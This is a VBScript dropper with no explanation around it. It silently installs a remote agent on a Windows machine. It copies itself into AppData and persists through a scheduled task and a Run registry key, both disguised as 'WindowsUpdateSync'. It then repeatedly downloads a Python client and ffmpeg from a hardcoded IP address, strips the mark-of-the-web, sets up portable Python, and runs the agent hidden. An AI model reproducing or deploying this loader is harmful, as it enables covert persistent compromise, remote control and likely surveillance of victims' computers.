On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")

' --- CONFIG ---
host_url = "http://109.120.132.231"
dir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\NinepeaksClient"
If Not fso.FolderExists(dir) Then fso.CreateFolder(dir)

' --- PERSISTENCE ---
my_path = WScript.ScriptFullName
target_vbs = dir & "\boot.vbs"

If LCase(my_path) <> LCase(target_vbs) Then
    fso.CopyFile my_path, target_vbs, True
End If

' Add to Task Scheduler to run on logon (User rights)
task_cmd = "schtasks /create /tn ""WindowsUpdateSync"" /tr ""wscript.exe \""" & target_vbs & "\"" //B //Nologo"" /sc onlogon /f"
sh.Run "cmd /c " & task_cmd, 0, True

' Fallback: Registry Run key
reg_key = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateSync"
sh.RegWrite reg_key, "wscript.exe """ & target_vbs & """ //B //Nologo", "REG_SZ"


Function Download(url, target)
    On Error Resume Next
    If fso.FileExists(target) Then fso.DeleteFile(target)
    sh.Run "cmd /c curl -L -k -s -o """ & target & """ """ & url & """", 0, True
    If fso.FileExists(target) Then
        If fso.GetFile(target).Size > 100 Then
            sh.Run "cmd /c del /f /q """ & target & ":Zone.Identifier""", 0, True
            Download = True: Exit Function
        End If
    End If
    Download = False
End Function

' 1. Download Agent
Do
    Randomize: rts = CStr(Fix(Timer * 1000))
    If Download(host_url & "/client.py?t=" & rts, dir & "\client.py") Then Exit Do
    WScript.Sleep 15000
Loop

' 2. Python Environment (Portable)
py_dir = dir & "\python": py_exe = py_dir & "\pythonw.exe"
If Not fso.FileExists(py_exe) Then
    zip = dir & "\py.zip"
    If Download("https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip", zip) Then
        If Not fso.FolderExists(py_dir) Then fso.CreateFolder(py_dir)
        Set sa = CreateObject("Shell.Application")
        sa.NameSpace(py_dir).CopyHere sa.NameSpace(zip).Items(), 16
        WScript.Sleep 10000
        Set ts = fso.OpenTextFile(py_dir & "\python311._pth", 8, True)
        ts.WriteLine "import site": ts.Close
        fso.DeleteFile zip
    End If
End If

' 2.5 FFmpeg for streaming
If Not fso.FileExists(dir & "\ffmpeg.exe") Then
    Download host_url & "/ffmpeg.exe", dir & "\ffmpeg.exe"
End If

' 3. Final Silent Run
sh.Run """" & py_exe & """ """ & dir & "\client.py""", 0, False
